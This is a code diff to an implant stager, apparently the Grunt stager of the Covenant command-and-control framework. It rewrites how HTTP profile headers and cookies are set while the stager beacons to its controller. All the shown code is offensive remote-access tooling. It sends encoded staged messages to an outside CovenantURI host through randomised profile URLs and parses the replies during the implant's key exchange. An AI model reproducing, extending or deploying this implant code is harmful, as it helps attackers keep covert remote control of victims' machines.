@@ -85,7 +85,17 @@ namespace GruntStager
                     {
                         try
                         {
-                            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", ""), ProfileHttpHeaderValues[i].Replace("{GUID}", "")); }
+                            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
+                            {
+                                if (ProfileHttpHeaderNames[i] == "Cookie")
+                                {
+                                    wc.SetCookies(new Uri(uri), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", ""));
+                                }
+                                else
+                                {
+                                    wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", ""), ProfileHttpHeaderValues[i].Replace("{GUID}", ""));
+                                }
+                            }
                             wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""));
                             CovenantURI = uri;
                         }
@@ -94,8 +104,18 @@ namespace GruntStager
                             continue;
                         }
                     }
-                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID)); }
-                    Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
+                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
+                    {
+                        if (ProfileHttpHeaderNames[i] == "Cookie")
+                        {
+                            wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
+                        }
+                        else
+                        {
+                            wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
+                        }
+                    }
+                    Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                     string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
                     extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                     List<string> parsed = Parse(extracted, MessageFormat);
@@ -124,8 +144,18 @@ namespace GruntStager
                     transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));
 
                     string Stage1Response = "";
-                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID)); }
-                    Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
+                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
+                    {
+                        if (ProfileHttpHeaderNames[i] == "Cookie")
+                        {
+                            wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
+                        }
+                        else
+                        {
+                            wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
+                        }
+                    }
+                    Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                     extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
                     extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                     parsed = Parse(extracted, MessageFormat);
@@ -151,8 +181,18 @@ namespace GruntStager
                     transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));
 
                     string Stage2Response = "";
-                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID)); }
-                    Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
+                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
+                    {
+                        if (ProfileHttpHeaderNames[i] == "Cookie")
+                        {
+                            wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
+                        }
+                        else
+                        {
+                            wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
+                        }
+                    }
+                    Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                     extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
                     extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                     parsed = Parse(extracted, MessageFormat);
@@ -176,6 +216,10 @@ namespace GruntStager
             public CookieWebClient()
             {
                 this.CookieContainer = new CookieContainer();
+            }
+            public void SetCookies(Uri uri, string cookies)
+            {
+                this.CookieContainer.SetCookies(uri, cookies);
             }
             protected override WebRequest GetWebRequest(Uri address)
             {
